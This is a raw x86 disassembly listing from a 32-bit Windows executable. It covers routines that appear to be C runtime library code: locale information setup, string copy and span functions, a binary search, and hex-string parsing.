  434925:	cmp    cl,0x3b
  434928:	jne    0x43491d
  43492a:	mov    esi,eax
  43492c:	lea    edi,[esi+0x1]
  43492f:	mov    cl,BYTE PTR [edi]
  434931:	mov    BYTE PTR [esi],cl
  434933:	mov    esi,edi
  434935:	cmp    BYTE PTR [esi],0x0
  434938:	jne    0x43492c
  43493a:	jmp    0x43491e
  43493c:	mov    eax,ds:0x43dd44
  434941:	mov    DWORD PTR ds:0x4650e8,esi
  434947:	mov    DWORD PTR [ebx],eax
  434949:	mov    eax,ds:0x43dd48
  43494e:	mov    DWORD PTR [ebx+0x4],eax
  434951:	mov    eax,ds:0x43dd4c
  434956:	mov    DWORD PTR [ebx+0x8],eax
  434959:	mov    eax,ds:0x4650e4
  43495e:	test   eax,eax
  434960:	je     0x434985
  434962:	cmp    DWORD PTR [eax],0x0
  434965:	jne    0x434985
  434967:	mov    ecx,DWORD PTR ds:0x43d6ec
  43496d:	cmp    eax,DWORD PTR [ecx+0x2c]
  434970:	je     0x434985
  434972:	push   eax
  434973:	call   0x42e0ed
  434978:	push   DWORD PTR ds:0x43fe24
  43497e:	call   0x42e0ed
  434983:	pop    ecx
  434984:	pop    ecx
  434985:	mov    eax,DWORD PTR [ebp-0x8]
  434988:	mov    ds:0x4650e4,eax
  43498d:	mov    DWORD PTR ds:0x43fe24,ebx
  434993:	mov    DWORD PTR ds:0x43dd74,ebx
  434999:	mov    eax,DWORD PTR [ebx]
  43499b:	mov    al,BYTE PTR [eax]
  43499d:	mov    ds:0x43dd94,al
  4349a2:	mov    DWORD PTR ds:0x43dd98,0x1
  4349ac:	xor    eax,eax
  4349ae:	pop    edi
  4349af:	pop    esi
  4349b0:	pop    ebx
  4349b1:	leave  
  4349b2:	ret    
  4349b3:	push   esi
  4349b4:	mov    esi,DWORD PTR [esp+0x8]
  4349b8:	test   esi,esi
  4349ba:	je     0x434a8a
  4349c0:	mov    eax,DWORD PTR [esi+0xc]
  4349c3:	mov    ecx,DWORD PTR ds:0x43dd74
  4349c9:	cmp    eax,DWORD PTR [ecx+0xc]
  4349cc:	je     0x4349dd
  4349ce:	cmp    eax,DWORD PTR ds:0x43dd50
  4349d4:	je     0x4349dd
  4349d6:	push   eax
  4349d7:	call   0x42e0ed
  4349dc:	pop    ecx
  4349dd:	mov    eax,DWORD PTR [esi+0x10]
  4349e0:	mov    ecx,DWORD PTR ds:0x43dd74
  4349e6:	cmp    eax,DWORD PTR [ecx+0x10]
  4349e9:	je     0x4349fa
  4349eb:	cmp    eax,DWORD PTR ds:0x43dd54
  4349f1:	je     0x4349fa
  4349f3:	push   eax
  4349f4:	call   0x42e0ed
  4349f9:	pop    ecx
  4349fa:	mov    eax,DWORD PTR [esi+0x14]
  4349fd:	mov    ecx,DWORD PTR ds:0x43dd74
  434a03:	cmp    eax,DWORD PTR [ecx+0x14]
  434a06:	je     0x434a17
  434a08:	cmp    eax,DWORD PTR ds:0x43dd58
  434a0e:	je     0x434a17
  434a10:	push   eax
  434a11:	call   0x42e0ed
  434a16:	pop    ecx
  434a17:	mov    eax,DWORD PTR [esi+0x18]
  434a1a:	mov    ecx,DWORD PTR ds:0x43dd74
  434a20:	cmp    eax,DWORD PTR [ecx+0x18]
  434a23:	je     0x434a34
  434a25:	cmp    eax,DWORD PTR ds:0x43dd5c
  434a2b:	je     0x434a34
  434a2d:	push   eax
  434a2e:	call   0x42e0ed
  434a33:	pop    ecx
  434a34:	mov    eax,DWORD PTR [esi+0x1c]
  434a37:	mov    ecx,DWORD PTR ds:0x43dd74
  434a3d:	cmp    eax,DWORD PTR [ecx+0x1c]
  434a40:	je     0x434a51
  434a42:	cmp    eax,DWORD PTR ds:0x43dd60
  434a48:	je     0x434a51
  434a4a:	push   eax
  434a4b:	call   0x42e0ed
  434a50:	pop    ecx
  434a51:	mov    eax,DWORD PTR [esi+0x20]
  434a54:	mov    ecx,DWORD PTR ds:0x43dd74
  434a5a:	cmp    eax,DWORD PTR [ecx+0x20]
  434a5d:	je     0x434a6e
  434a5f:	cmp    eax,DWORD PTR ds:0x43dd64
  434a65:	je     0x434a6e
  434a67:	push   eax
  434a68:	call   0x42e0ed
  434a6d:	pop    ecx
  434a6e:	mov    esi,DWORD PTR [esi+0x24]
  434a71:	mov    eax,ds:0x43dd74
  434a76:	cmp    esi,DWORD PTR [eax+0x24]
  434a79:	je     0x434a8a
  434a7b:	cmp    esi,DWORD PTR ds:0x43dd68
  434a81:	je     0x434a8a
  434a83:	push   esi
  434a84:	call   0x42e0ed
  434a89:	pop    ecx
  434a8a:	pop    esi
  434a8b:	ret    
  434a8c:	push   ebp
  434a8d:	mov    ebp,esp
  434a8f:	push   ecx
  434a90:	push   ebx
  434a91:	push   esi
  434a92:	xor    esi,esi
  434a94:	cmp    DWORD PTR ds:0x43fe58,esi
  434a9a:	push   edi
  434a9b:	jne    0x434ac6
  434a9d:	cmp    DWORD PTR ds:0x43fe5c,esi
  434aa3:	jne    0x434ac6
  434aa5:	mov    DWORD PTR ds:0x4650e0,esi
  434aab:	mov    DWORD PTR ds:0x4650e4,esi
  434ab1:	mov    DWORD PTR ds:0x43dd74,0x43dd44
  434abb:	mov    DWORD PTR ds:0x43fe24,esi
  434ac1:	jmp    0x434cc4
  434ac6:	push   0x30
  434ac8:	push   0x1
  434aca:	call   0x4340db
  434acf:	mov    ebx,eax
  434ad1:	cmp    ebx,esi
  434ad3:	pop    ecx
  434ad4:	pop    ecx
  434ad5:	je     0x434c44
  434adb:	push   0x4
  434add:	call   0x4311fe
  434ae2:	mov    edi,eax
  434ae4:	cmp    edi,esi
  434ae6:	pop    ecx
  434ae7:	mov    DWORD PTR [ebp-0x4],edi
  434aea:	jne    0x434af8
  434aec:	push   ebx
  434aed:	call   0x42e0ed
  434af2:	pop    ecx
  434af3:	jmp    0x434c44
  434af8:	mov    DWORD PTR [edi],esi
  434afa:	cmp    DWORD PTR ds:0x43fe58,esi
  434b00:	je     0x434c7e
  434b06:	push   0x4
  434b08:	call   0x4311fe
  434b0d:	cmp    eax,esi
  434b0f:	pop    ecx
  434b10:	mov    ds:0x4650e0,eax
  434b15:	jne    0x434b26
  434b17:	push   ebx
  434b18:	call   0x42e0ed
  434b1d:	push   edi
  434b1e:	call   0x42e0ed
  434b23:	pop    ecx
  434b24:	jmp    0x434af2
  434b26:	mov    DWORD PTR [eax],esi
  434b28:	movzx  esi,WORD PTR ds:0x43fe84
  434b2f:	lea    eax,[ebx+0xc]
  434b32:	push   eax
  434b33:	push   0x15
  434b35:	push   esi
  434b36:	push   0x1
  434b38:	call   0x435fc0
  434b3d:	mov    edi,eax
  434b3f:	lea    eax,[ebx+0x10]
  434b42:	push   eax
  434b43:	push   0x14
  434b45:	push   esi
  434b46:	push   0x1
  434b48:	call   0x435fc0
  434b4d:	or     edi,eax
  434b4f:	lea    eax,[ebx+0x14]
  434b52:	push   eax
  434b53:	push   0x16
  434b55:	push   esi
  434b56:	push   0x1
  434b58:	call   0x435fc0
  434b5d:	or     edi,eax
  434b5f:	lea    eax,[ebx+0x18]
  434b62:	push   eax
  434b63:	push   0x17
  434b65:	push   esi
  434b66:	push   0x1
  434b68:	call   0x435fc0
  434b6d:	add    esp,0x40
  434b70:	or     edi,eax
  434b72:	lea    eax,[ebx+0x1c]
  434b75:	push   eax
  434b76:	push   0x18
  434b78:	push   esi
  434b79:	push   0x1
  434b7b:	call   0x435fc0
  434b80:	or     edi,eax
  434b82:	lea    eax,[ebx+0x20]
  434b85:	push   eax
  434b86:	push   0x50
  434b88:	push   esi
  434b89:	push   0x1
  434b8b:	call   0x435fc0
  434b90:	or     edi,eax
  434b92:	lea    eax,[ebx+0x24]
  434b95:	push   eax
  434b96:	push   0x51
  434b98:	push   esi
  434b99:	push   0x1
  434b9b:	call   0x435fc0
  434ba0:	or     edi,eax
  434ba2:	lea    eax,[ebx+0x28]
  434ba5:	push   eax
  434ba6:	push   0x1a
  434ba8:	push   esi
  434ba9:	push   0x0
  434bab:	call   0x435fc0
  434bb0:	add    esp,0x40
  434bb3:	or     edi,eax
  434bb5:	lea    eax,[ebx+0x29]
  434bb8:	push   eax
  434bb9:	push   0x19
  434bbb:	push   esi
  434bbc:	push   0x0
  434bbe:	call   0x435fc0
  434bc3:	or     edi,eax
  434bc5:	lea    eax,[ebx+0x2a]
  434bc8:	push   eax
  434bc9:	push   0x54
  434bcb:	push   esi
  434bcc:	push   0x0
  434bce:	call   0x435fc0
  434bd3:	or     edi,eax
  434bd5:	lea    eax,[ebx+0x2b]
  434bd8:	push   eax
  434bd9:	push   0x55
  434bdb:	push   esi
  434bdc:	push   0x0
  434bde:	call   0x435fc0
  434be3:	or     edi,eax
  434be5:	lea    eax,[ebx+0x2c]
  434be8:	push   eax
  434be9:	push   0x56
  434beb:	push   esi
  434bec:	push   0x0
  434bee:	call   0x435fc0
  434bf3:	add    esp,0x40
  434bf6:	or     edi,eax
  434bf8:	lea    eax,[ebx+0x2d]
  434bfb:	push   eax
  434bfc:	push   0x57
  434bfe:	push   esi
  434bff:	push   0x0
  434c01:	call   0x435fc0
  434c06:	or     edi,eax
  434c08:	lea    eax,[ebx+0x2e]
  434c0b:	push   eax
  434c0c:	push   0x52
  434c0e:	push   esi
  434c0f:	push   0x0
  434c11:	call   0x435fc0
  434c16:	or     edi,eax
  434c18:	lea    eax,[ebx+0x2f]
  434c1b:	push   eax
  434c1c:	push   0x53
  434c1e:	push   esi
  434c1f:	push   0x0
  434c21:	call   0x435fc0
  434c26:	add    esp,0x30
  434c29:	or     eax,edi
  434c2b:	je     0x434c49
  434c2d:	push   ebx
  434c2e:	call   0x4349b3
  434c33:	push   ebx
  434c34:	call   0x42e0ed
  434c39:	push   DWORD PTR [ebp-0x4]
  434c3c:	call   0x42e0ed
  434c41:	add    esp,0xc
  434c44:	xor    eax,eax
  434c46:	inc    eax
  434c47:	jmp    0x434cc6
  434c49:	mov    eax,DWORD PTR [ebx+0x1c]
  434c4c:	jmp    0x434c60
  434c4e:	mov    cl,BYTE PTR [eax]
  434c50:	cmp    cl,0x30
  434c53:	jl     0x434c67
  434c55:	cmp    cl,0x39
  434c58:	jg     0x434c67
  434c5a:	sub    cl,0x30
  434c5d:	mov    BYTE PTR [eax],cl
  434c5f:	inc    eax
  434c60:	cmp    BYTE PTR [eax],0x0
  434c63:	jne    0x434c4e
  434c65:	jmp    0x434c91
  434c67:	cmp    cl,0x3b
  434c6a:	jne    0x434c5f
  434c6c:	mov    esi,eax
  434c6e:	lea    edi,[esi+0x1]
  434c71:	mov    cl,BYTE PTR [edi]
  434c73:	mov    BYTE PTR [esi],cl
  434c75:	mov    esi,edi
  434c77:	cmp    BYTE PTR [esi],0x0
  434c7a:	jne    0x434c6e
  434c7c:	jmp    0x434c60
  434c7e:	push   0xc
  434c80:	pop    ecx
  434c81:	mov    esi,0x43dd44
  434c86:	mov    edi,ebx
  434c88:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434c8a:	and    DWORD PTR ds:0x4650e0,0x0
  434c91:	mov    eax,ds:0x43dd74
  434c96:	mov    eax,DWORD PTR [eax]
  434c98:	mov    DWORD PTR [ebx],eax
  434c9a:	mov    eax,ds:0x43dd74
  434c9f:	mov    eax,DWORD PTR [eax+0x4]
  434ca2:	mov    DWORD PTR [ebx+0x4],eax
  434ca5:	mov    eax,ds:0x43dd74
  434caa:	mov    eax,DWORD PTR [eax+0x8]
  434cad:	mov    DWORD PTR [ebx+0x8],eax
  434cb0:	mov    eax,DWORD PTR [ebp-0x4]
  434cb3:	mov    DWORD PTR ds:0x43dd74,ebx
  434cb9:	mov    ds:0x4650e4,eax
  434cbe:	mov    DWORD PTR ds:0x43fe24,ebx
  434cc4:	xor    eax,eax
  434cc6:	pop    edi
  434cc7:	pop    esi
  434cc8:	pop    ebx
  434cc9:	leave  
  434cca:	ret    
  434ccb:	int3   
  434ccc:	int3   
  434ccd:	int3   
  434cce:	int3   
  434ccf:	int3   
  434cd0:	push   ebp
  434cd1:	mov    ebp,esp
  434cd3:	push   esi
  434cd4:	xor    eax,eax
  434cd6:	push   eax
  434cd7:	push   eax
  434cd8:	push   eax
  434cd9:	push   eax
  434cda:	push   eax
  434cdb:	push   eax
  434cdc:	push   eax
  434cdd:	push   eax
  434cde:	mov    edx,DWORD PTR [ebp+0xc]
  434ce1:	lea    ecx,[ecx+0x0]
  434ce4:	mov    al,BYTE PTR [edx]
  434ce6:	or     al,al
  434ce8:	je     0x434cf3
  434cea:	add    edx,0x1
  434ced:	bts    DWORD PTR [esp],eax
  434cf1:	jmp    0x434ce4
  434cf3:	mov    esi,DWORD PTR [ebp+0x8]
  434cf6:	or     ecx,0xffffffff
  434cf9:	lea    ecx,[ecx+0x0]
  434cfc:	add    ecx,0x1
  434cff:	mov    al,BYTE PTR [esi]
  434d01:	or     al,al
  434d03:	je     0x434d0e
  434d05:	add    esi,0x1
  434d08:	bt     DWORD PTR [esp],eax
  434d0c:	jae    0x434cfc
  434d0e:	mov    eax,ecx
  434d10:	add    esp,0x20
  434d13:	pop    esi
  434d14:	leave  
  434d15:	ret    
  434d16:	int3   
  434d17:	int3   
  434d18:	int3   
  434d19:	int3   
  434d1a:	int3   
  434d1b:	int3   
  434d1c:	int3   
  434d1d:	int3   
  434d1e:	int3   
  434d1f:	int3   
  434d20:	mov    ecx,DWORD PTR [esp+0xc]
  434d24:	push   edi
  434d25:	test   ecx,ecx
  434d27:	je     0x434dbf
  434d2d:	push   esi
  434d2e:	push   ebx
  434d2f:	mov    ebx,ecx
  434d31:	mov    esi,DWORD PTR [esp+0x14]
  434d35:	test   esi,0x3
  434d3b:	mov    edi,DWORD PTR [esp+0x10]
  434d3f:	jne    0x434d4c
  434d41:	shr    ecx,0x2
  434d44:	jne    0x434dcf
  434d4a:	jmp    0x434d73
  434d4c:	mov    al,BYTE PTR [esi]
  434d4e:	add    esi,0x1
  434d51:	mov    BYTE PTR [edi],al
  434d53:	add    edi,0x1
  434d56:	sub    ecx,0x1
  434d59:	je     0x434d86
  434d5b:	test   al,al
  434d5d:	je     0x434d8e
  434d5f:	test   esi,0x3
  434d65:	jne    0x434d4c
  434d67:	mov    ebx,ecx
  434d69:	shr    ecx,0x2
  434d6c:	jne    0x434dcf
  434d6e:	and    ebx,0x3
  434d71:	je     0x434d86
  434d73:	mov    al,BYTE PTR [esi]
  434d75:	add    esi,0x1
  434d78:	mov    BYTE PTR [edi],al
  434d7a:	add    edi,0x1
  434d7d:	test   al,al
  434d7f:	je     0x434db8
  434d81:	sub    ebx,0x1
  434d84:	jne    0x434d73
  434d86:	mov    eax,DWORD PTR [esp+0x10]
  434d8a:	pop    ebx
  434d8b:	pop    esi
  434d8c:	pop    edi
  434d8d:	ret    
  434d8e:	test   edi,0x3
  434d94:	je     0x434dac
  434d96:	mov    BYTE PTR [edi],al
  434d98:	add    edi,0x1
  434d9b:	sub    ecx,0x1
  434d9e:	je     0x434e3c
  434da4:	test   edi,0x3
  434daa:	jne    0x434d96
  434dac:	mov    ebx,ecx
  434dae:	shr    ecx,0x2
  434db1:	jne    0x434e27
  434db3:	mov    BYTE PTR [edi],al
  434db5:	add    edi,0x1
  434db8:	sub    ebx,0x1
  434dbb:	jne    0x434db3
  434dbd:	pop    ebx
  434dbe:	pop    esi
  434dbf:	mov    eax,DWORD PTR [esp+0x8]
  434dc3:	pop    edi
  434dc4:	ret    
  434dc5:	mov    DWORD PTR [edi],edx
  434dc7:	add    edi,0x4
  434dca:	sub    ecx,0x1
  434dcd:	je     0x434d6e
  434dcf:	mov    edx,0x7efefeff
  434dd4:	mov    eax,DWORD PTR [esi]
  434dd6:	add    edx,eax
  434dd8:	xor    eax,0xffffffff
  434ddb:	xor    eax,edx
  434ddd:	mov    edx,DWORD PTR [esi]
  434ddf:	add    esi,0x4
  434de2:	test   eax,0x81010100
  434de7:	je     0x434dc5
  434de9:	test   dl,dl
  434deb:	je     0x434e19
  434ded:	test   dh,dh
  434def:	je     0x434e0f
  434df1:	test   edx,0xff0000
  434df7:	je     0x434e05
  434df9:	test   edx,0xff000000
  434dff:	jne    0x434dc5
  434e01:	mov    DWORD PTR [edi],edx
  434e03:	jmp    0x434e1d
  434e05:	and    edx,0xffff
  434e0b:	mov    DWORD PTR [edi],edx
  434e0d:	jmp    0x434e1d
  434e0f:	and    edx,0xff
  434e15:	mov    DWORD PTR [edi],edx
  434e17:	jmp    0x434e1d
  434e19:	xor    edx,edx
  434e1b:	mov    DWORD PTR [edi],edx
  434e1d:	add    edi,0x4
  434e20:	xor    eax,eax
  434e22:	sub    ecx,0x1
  434e25:	je     0x434e33
  434e27:	xor    eax,eax
  434e29:	mov    DWORD PTR [edi],eax
  434e2b:	add    edi,0x4
  434e2e:	sub    ecx,0x1
  434e31:	jne    0x434e29
  434e33:	and    ebx,0x3
  434e36:	jne    0x434db3
  434e3c:	mov    eax,DWORD PTR [esp+0x10]
  434e40:	pop    ebx
  434e41:	pop    esi
  434e42:	pop    edi
  434e43:	ret    
  434e44:	push   ebp
  434e45:	mov    ebp,esp
  434e47:	xor    eax,eax
  434e49:	push   ebx
  434e4a:	xor    ebx,ebx
  434e4c:	inc    eax
  434e4d:	cmp    DWORD PTR [ebp+0xc],ebx
  434e50:	jl     0x434e98
  434e52:	push   esi
  434e53:	push   edi
  434e54:	test   eax,eax
  434e56:	je     0x434e96
  434e58:	mov    eax,DWORD PTR [ebp+0xc]
  434e5b:	add    eax,ebx
  434e5d:	cdq    
  434e5e:	sub    eax,edx
  434e60:	mov    esi,eax
  434e62:	mov    eax,DWORD PTR [ebp+0x8]
  434e65:	sar    esi,1
  434e67:	lea    edi,[eax+esi*8]
  434e6a:	push   DWORD PTR [edi]
  434e6c:	mov    eax,DWORD PTR [ebp+0x10]
  434e6f:	push   DWORD PTR [eax]
  434e71:	call   0x43732e
  434e76:	test   eax,eax
  434e78:	pop    ecx
  434e79:	pop    ecx
  434e7a:	jne    0x434e86
  434e7c:	mov    ecx,DWORD PTR [ebp+0x10]
  434e7f:	add    edi,0x4
  434e82:	mov    DWORD PTR [ecx],edi
  434e84:	jmp    0x434e91
  434e86:	jge    0x434e8e
  434e88:	dec    esi
  434e89:	mov    DWORD PTR [ebp+0xc],esi
  434e8c:	jmp    0x434e91
  434e8e:	lea    ebx,[esi+0x1]
  434e91:	cmp    ebx,DWORD PTR [ebp+0xc]
  434e94:	jle    0x434e54
  434e96:	pop    edi
  434e97:	pop    esi
  434e98:	xor    ecx,ecx
  434e9a:	test   eax,eax
  434e9c:	sete   cl
  434e9f:	pop    ebx
  434ea0:	mov    eax,ecx
  434ea2:	pop    ebp
  434ea3:	ret    
  434ea4:	or     WORD PTR ds:0x43fe28,0x104
  434ead:	call   DWORD PTR ds:0x439120
  434eb3:	mov    ds:0x43fe30,eax
  434eb8:	mov    ds:0x43fe2c,eax
  434ebd:	ret    
  434ebe:	push   ebp
  434ebf:	mov    ebp,esp
  434ec1:	sub    esp,0xc
  434ec4:	mov    eax,ds:0x43d404
  434ec9:	push   esi
  434eca:	mov    esi,ecx
  434ecc:	test   esi,esi
  434ece:	mov    DWORD PTR [ebp-0x4],eax
  434ed1:	je     0x434f04
  434ed3:	cmp    BYTE PTR [esi],0x0
  434ed6:	je     0x434f04
  434ed8:	push   0x43b2f8
  434edd:	push   esi
  434ede:	call   0x432b80
  434ee3:	test   eax,eax
  434ee5:	pop    ecx
  434ee6:	pop    ecx
  434ee7:	je     0x434f04
  434ee9:	push   0x43b2f4
  434eee:	push   esi
  434eef:	call   0x432b80
  434ef4:	test   eax,eax
  434ef6:	pop    ecx
  434ef7:	pop    ecx
  434ef8:	jne    0x434f22
  434efa:	push   0x8
  434efc:	lea    eax,[ebp-0xc]
  434eff:	push   eax
  434f00:	push   0xb
  434f02:	jmp    0x434f0f
  434f04:	push   0x8
  434f06:	lea    eax,[ebp-0xc]
  434f09:	push   eax
  434f0a:	push   0x1004
  434f0f:	push   DWORD PTR ds:0x43fe30
  434f15:	call   DWORD PTR ds:0x43fe48
  434f1b:	test   eax,eax
  434f1d:	je     0x434f29
  434f1f:	lea    esi,[ebp-0xc]
  434f22:	push   esi
  434f23:	call   0x437397
  434f28:	pop    ecx
  434f29:	mov    ecx,DWORD PTR [ebp-0x4]
  434f2c:	pop    esi
  434f2d:	call   0x42f1f2
  434f32:	leave  
  434f33:	ret    
  434f34:	xor    eax,eax
  434f36:	mov    cx,WORD PTR [esp+0x4]
  434f3b:	cmp    cx,WORD PTR [eax+0x43ab14]
  434f42:	je     0x434f4f
  434f44:	inc    eax
  434f45:	inc    eax
  434f46:	cmp    eax,0x14
  434f49:	jb     0x434f36
  434f4b:	xor    eax,eax
  434f4d:	inc    eax
  434f4e:	ret    
  434f4f:	xor    eax,eax
  434f51:	ret    
  434f52:	push   ebp
  434f53:	mov    ebp,esp
  434f55:	push   ebx
  434f56:	push   esi
  434f57:	push   edi
  434f58:	push   0x1a
  434f5a:	xor    esi,esi
  434f5c:	pop    edi
  434f5d:	mov    ebx,DWORD PTR [ebp+0x14]
  434f60:	lea    eax,[edi+esi*1]
  434f63:	cdq    
  434f64:	sub    eax,edx
  434f66:	sar    eax,1
  434f68:	mov    ecx,eax
  434f6a:	imul   ecx,ecx,0x2c
  434f6d:	mov    ecx,DWORD PTR [ecx+0x43a4f8]
  434f73:	cmp    DWORD PTR [ebp+0x8],ecx
  434f76:	je     0x434f9d
  434f78:	jae    0x434f7f
  434f7a:	lea    edi,[eax-0x1]
  434f7d:	jmp    0x434f82
  434f7f:	lea    esi,[eax+0x1]
  434f82:	cmp    esi,edi
  434f84:	jle    0x434f5d
  434f86:	push   ebx
  434f87:	push   DWORD PTR [ebp+0x10]
  434f8a:	push   DWORD PTR [ebp+0xc]
  434f8d:	push   DWORD PTR [ebp+0x8]
  434f90:	call   DWORD PTR ds:0x439124
  434f96:	pop    edi
  434f97:	pop    esi
  434f98:	pop    ebx
  434f99:	pop    ebp
  434f9a:	ret    0x10
  434f9d:	mov    ecx,DWORD PTR [ebp+0xc]
  434fa0:	dec    ecx
  434fa1:	je     0x434ffe
  434fa3:	dec    ecx
  434fa4:	dec    ecx
  434fa5:	je     0x434ff4
  434fa7:	sub    ecx,0x4
  434faa:	je     0x434fea
  434fac:	sub    ecx,0x4
  434faf:	je     0x434fe0
  434fb1:	sub    ecx,0xff6
  434fb7:	je     0x434fd5
  434fb9:	dec    ecx
  434fba:	je     0x434fca
  434fbc:	dec    ecx
  434fbd:	dec    ecx
  434fbe:	jne    0x434f86
  434fc0:	imul   eax,eax,0x2c
  434fc3:	add    eax,0x43a51c
  434fc8:	jmp    0x435006
  434fca:	imul   eax,eax,0x2c
  434fcd:	mov    eax,DWORD PTR [eax+0x43a50c]
  434fd3:	jmp    0x435006
  434fd5:	imul   eax,eax,0x2c
  434fd8:	mov    eax,DWORD PTR [eax+0x43a504]
  434fde:	jmp    0x435006
  434fe0:	imul   eax,eax,0x2c
  434fe3:	add    eax,0x43a514
  434fe8:	jmp    0x435006
  434fea:	imul   eax,eax,0x2c
  434fed:	add    eax,0x43a510
  434ff2:	jmp    0x435006
  434ff4:	imul   eax,eax,0x2c
  434ff7:	add    eax,0x43a508
  434ffc:	jmp    0x435006
  434ffe:	imul   eax,eax,0x2c
  435001:	add    eax,0x43a4fc
  435006:	test   eax,eax
  435008:	je     0x434f86
  43500e:	cmp    ebx,0x1
  435011:	jl     0x434f86
  435017:	mov    esi,DWORD PTR [ebp+0x10]
  43501a:	lea    ecx,[ebx-0x1]
  43501d:	push   ecx
  43501e:	push   eax
  43501f:	push   esi
  435020:	call   0x434d20
  435025:	xor    eax,eax
  435027:	add    esp,0xc
  43502a:	mov    BYTE PTR [esi+ebx*1-0x1],0x0
  43502f:	inc    eax
  435030:	jmp    0x434f96
  435035:	xor    eax,eax
  435037:	jmp    0x435063
  435039:	inc    edx
  43503a:	cmp    cl,0x61
  43503d:	jl     0x435049
  43503f:	cmp    cl,0x66
  435042:	jg     0x435049
  435044:	add    cl,0xd9
  435047:	jmp    0x435056
  435049:	cmp    cl,0x41
  43504c:	jl     0x435056
  43504e:	cmp    cl,0x46
  435051:	jg     0x435056
  435053:	add    cl,0xf9
  435056:	add    eax,0xffffffd
  43505b:	movsx  ecx,cl
  43505e:	shl    eax,0x4
  435061:	add    eax,ecx
  435063:	mov    cl,BYTE PTR [edx]
  435065:	test   cl,cl
  435067:	jne    0x435039
  435069:	ret    
  43506a:	xor    eax,eax
  43506c:	mov    cl,BYTE PTR [edx]
  43506e:	inc    edx
  43506f:	cmp    cl,0x41
  435072:	jl     0x435079
  435074:	cmp    cl,0x5a
  435077:	jle    0x435083
  435079:	cmp    cl,0x61
  43507c:	jl     0x435086
  43507e:	cmp    cl,0x7a
  435081:	jg     0x435086
  435083:	inc    eax
  435084:	jmp    0x43506c
  435086:	ret    
  435087:	push   ebp
  435088:	mov    ebp,esp
  43508a:	sub    esp,0x7c
  43508d:	mov    eax,ds:0x43d404
  435092:	mov    edx,DWORD PTR [ebp+0x8]
  435095:	push   esi
  435096:	mov    DWORD PTR [ebp-0x4],eax
  435099:	call   0x435035
  43509e:	mov    esi,eax
  4350a0:	push   0x78
  4350a2:	lea    eax,[ebp-0x7c]
  4350a5:	push   eax
  4350a6:	mov    eax,ds:0x43fe38
  4350ab:	neg    eax
  4350ad:	sbb    eax,eax
  4350af:	and    eax,0xfffff005
  4350b4:	add    eax,0x1002
  4350b9:	push   eax
  4350ba:	push   esi
  4350bb:	call   DWORD PTR ds:0x43fe48
  4350c1:	test   eax,eax
  4350c3:	jne    0x4350ce
  4350c5:	and    DWORD PTR ds:0x43fe28,eax
  4350cb:	inc    eax
  4350cc:	jmp    0x43510e
  4350ce:	lea    eax,[ebp-0x7c]
  4350d1:	push   eax
  4350d2:	push   DWORD PTR ds:0x43fe3c
  4350d8:	call   0x43732e
  4350dd:	test   eax,eax
  4350df:	pop    ecx
  4350e0:	pop    ecx
  4350e1:	jne    0x435101
  4350e3:	push   esi
  4350e4:	call   0x434f34
  4350e9:	test   eax,eax
  4350eb:	pop    ecx
  4350ec:	je     0x435101
  4350ee:	or     DWORD PTR ds:0x43fe28,0x4
  4350f5:	mov    DWORD PTR ds:0x43fe30,esi
  4350fb:	mov    DWORD PTR ds:0x43fe2c,esi
  435101:	mov    eax,ds:0x43fe28
  435106:	shr    eax,0x2
  435109:	not    eax
  43510b:	and    eax,0x1
  43510e:	mov    ecx,DWORD PTR [ebp-0x4]
  435111:	pop    esi
  435112:	call   0x42f1f2
  435117:	leave  
  435118:	ret    0x4
  43511b:	push   ebp
  43511c:	mov    ebp,esp
  43511e:	sub    esp,0x7c
  435121:	mov    eax,ds:0x43d404
  435126:	mov    DWORD PTR [ebp-0x4],eax
  435129:	push   0x78
  43512b:	lea    eax,[ebp-0x7c]
  43512e:	push   eax
  43512f:	mov    eax,DWORD PTR [ebp+0x8]
  435132:	and    eax,0x3ff
  435137:	push   0x1
  435139:	or     eax,0x400
  43513e:	push   eax
  43513f:	call   DWORD PTR ds:0x43fe48
  435145:	test   eax,eax
  435147:	je     0x43517b
  435149:	lea    edx,[ebp-0x7c]
  43514c:	call   0x435035
  435151:	cmp    DWORD PTR [ebp+0x8],eax
  435154:	je     0x43517f
  435156:	cmp    DWORD PTR [ebp+0xc],0x0
  43515a:	je     0x43517f
  43515c:	push   esi
  43515d:	push   DWORD PTR ds:0x43fe44
  435163:	call   0x42e160
  435168:	mov    edx,DWORD PTR ds:0x43fe44
  43516e:	pop    ecx
  43516f:	mov    esi,eax
  435171:	call   0x43506a
  435176:	cmp    eax,esi
  435178:	pop    esi
  435179:	jne    0x43517f
  43517b:	xor    eax,eax
  43517d:	jmp    0x435182
  43517f:	xor    eax,eax
  435181:	inc    eax
  435182:	mov    ecx,DWORD PTR [ebp-0x4]
  435185:	call   0x42f1f2
  43518a:	leave  
  43518b:	ret    
  43518c:	push   ebp
  43518d:	mov    ebp,esp
  43518f:	sub    esp,0x7c
  435192:	mov    eax,ds:0x43d404
  435197:	mov    edx,DWORD PTR [ebp+0x8]
  43519a:	push   esi
  43519b:	mov    DWORD PTR [ebp-0x4],eax
  43519e:	call   0x435035
  4351a3:	mov    esi,eax
  4351a5:	push   0x78
  4351a7:	lea    eax,[ebp-0x7c]
  4351aa:	push   eax
  4351ab:	mov    eax,ds:0x43fe38
  4351b0:	neg    eax
  4351b2:	sbb    eax,eax
  4351b4:	and    eax,0xfffff005
  4351b9:	add    eax,0x1002
  4351be:	push   eax
  4351bf:	push   esi
  4351c0:	call   DWORD PTR ds:0x43fe48
  4351c6:	test   eax,eax
  4351c8:	jne    0x4351d6
  4351ca:	and    DWORD PTR ds:0x43fe28,eax
  4351d0:	inc    eax
  4351d1:	jmp    0x435399
  4351d6:	push   ebx
  4351d7:	push   edi
  4351d8:	lea    eax,[ebp-0x7c]
  4351db:	push   eax
  4351dc:	push   DWORD PTR ds:0x43fe3c
  4351e2:	call   0x43732e
  4351e7:	test   eax,eax
  4351e9:	pop    ecx
  4351ea:	pop    ecx
  4351eb:	mov    ebx,0xfffff002
  4351f0:	mov    edi,0x1001
  4351f5:	jne    0x4352b7
  4351fb:	push   0x78
  4351fd:	lea    eax,[ebp-0x7c]
  435200:	push   eax
  435201:	mov    eax,ds:0x43fe34
  435206:	neg    eax
  435208:	sbb    eax,eax
  43520a:	and    eax,ebx
  43520c:	add    eax,edi
  43520e:	push   eax
  43520f:	push   esi
  435210:	call   DWORD PTR ds:0x43fe48
  435216:	test   eax,eax
  435218:	je     0x4352eb
  43521e:	lea    eax,[ebp-0x7c]
  435221:	push   eax
  435222:	push   DWORD PTR ds:0x43fe44
  435228:	call   0x43732e
  43522d:	test   eax,eax
  43522f:	pop    ecx
